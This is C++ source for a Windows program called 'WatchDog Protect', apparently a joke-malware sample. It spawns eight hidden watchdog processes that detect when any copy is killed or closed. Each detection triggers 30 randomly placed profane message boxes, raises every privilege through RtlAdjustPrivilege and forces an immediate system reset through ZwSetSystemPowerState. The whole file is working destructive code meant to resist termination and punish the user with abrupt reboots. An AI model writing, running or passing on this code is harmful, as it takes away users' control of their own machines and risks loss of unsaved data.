#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>
#include <iostream>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 
#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0x00000001L)
HWND dialog;
HCRYPTPROV prov;
int scrw, scrh;

typedef NTSTATUS(_stdcall* pRtlAdjustPrivilege)(
	ULONG                       Privilege,
	int                         Enable,
	int                         CurrentThread,
	int* Enabled
	);
pRtlAdjustPrivilege RtlAdjustPrivilege;

typedef NTSTATUS(_stdcall* pNtSetSystemPowerState)(
	POWER_ACTION 		        SystemAction,
	SYSTEM_POWER_STATE 	        MinSystemState,
	ULONG 				        Flags
	);
pNtSetSystemPowerState NtSetSystemPowerState;
HINSTANCE GetSystemApiAddress()
{
	HINSTANCE hModuleNtdll = LoadLibraryA("Ntdll.dll");
	if (hModuleNtdll == NULL) return FALSE;
	RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hModuleNtdll, "RtlAdjustPrivilege");
	if (RtlAdjustPrivilege == NULL) return FALSE;
	NtSetSystemPowerState = (pNtSetSystemPowerState)GetProcAddress(hModuleNtdll, "ZwSetSystemPowerState");
	if (NtSetSystemPowerState == NULL) return FALSE;
	return hModuleNtdll;
}
BOOL ElevationPrivilege()
{
	int PrivilegeNum, Out;
	for (PrivilegeNum = 1; PrivilegeNum <= 36; PrivilegeNum++)
	{
		RtlAdjustPrivilege(PrivilegeNum, 1, 0, &Out);
	}
	return TRUE;
}
const char* msgs[] = {
	"YOU KILL WATCHDOG PROCESS!\n\rFUCK U",
	"YOU OPEN TASKMGR TO KILL ME!!!!\n\nDie Now!",
	"I just wanna you die\n\rSo go out",
	"https://space.bilibili.com/1267481159?spm_id_from=333.1007.0.0\n\nPowered By ShaShen",
	"MsgHook is All over",
	"Not System.....\n\r",
	"Get Syscall Index Failed\n\rPlease Wait a moment",
	"FUCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK U!!!!!!!!!!!!!!!!!",
	"HuoRong 6.0 IS LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL",
	"PYAS (X) ImportYAS(¡Ì)",
};
const size_t nMsgs = sizeof(msgs) / sizeof(void*);
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
};
VOID killWindows();
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
		killWindows();
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "WatchDog Protect", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
DWORD WINAPI watchdogThread(LPVOID parameter) {
	int oproc = 0;

	char* fn = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);

	Sleep(1000);

	for (;;) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		Process32First(snapshot, &proc);

		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			char* fn2 = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileNameA(hProc, fn2, 512);

			if (!lstrcmpA(fn, fn2)) {
				nproc++;
			}

			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (nproc < oproc) {
			killWindows();
		}

		oproc = nproc;

		Sleep(10);
	}
}
VOID killWindows() {
	// Show cool MessageBoxes
	for (int i = 0; i < 30; i++) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(100);
	}
	ElevationPrivilege();
	NtSetSystemPowerState(PowerActionShutdownReset, PowerSystemShutdown, POWER_ACTION_CRITICAL);
}
VOID RUNWATCHDOG() {
	CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);

	WNDCLASSEXA c;
	c.cbSize = sizeof(WNDCLASSEXA);
	c.lpfnWndProc = WindowProc;
	c.lpszClassName = "hax";
	c.style = 0;
	c.cbClsExtra = 0;
	c.cbWndExtra = 0;
	c.hInstance = NULL;
	c.hIcon = 0;
	c.hCursor = 0;
	c.hbrBackground = 0;
	c.lpszMenuName = NULL;
	c.hIconSm = 0;

	RegisterClassExA(&c);

	HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}
VOID INITWATCHDOG() {

	wchar_t* fn = (wchar_t*)LocalAlloc(LMEM_ZEROINIT, 8192 * 2);
	GetModuleFileName(NULL, fn, 8192);

	for (int i = 0; i < 8; i++)
		ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);

	SHELLEXECUTEINFO info;
	info.cbSize = sizeof(SHELLEXECUTEINFO);
	info.lpFile = fn;
	info.lpParameters = L"/main";
	info.fMask = SEE_MASK_NOCLOSEPROCESS;
	info.hwnd = NULL;
	info.lpVerb = NULL;
	info.lpDirectory = NULL;
	info.hInstApp = NULL;
	info.nShow = SW_SHOWDEFAULT;

	ShellExecuteEx(&info);

	SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);
}
VOID main() {

	scrw = GetSystemMetrics(SM_CXSCREEN);
	scrh = GetSystemMetrics(SM_CYSCREEN);
	int argc;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	GetSystemApiAddress();
	if (argc > 1) {
		if (!lstrcmpW(argv[1], L"/watchdog")) {
			RUNWATCHDOG();
		}
	}
	else {
		if (MessageBoxA(NULL, "The software you just executed is WatchDog Protect\n\r\
If You try to kill process protected by WatchDog\n\r\
YOUR SYSTEM WILL RESET", "WatchDog Protect", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}
		INITWATCHDOG();
		// Another very ugly formatting
		Sleep(INFINITY);
	}
}
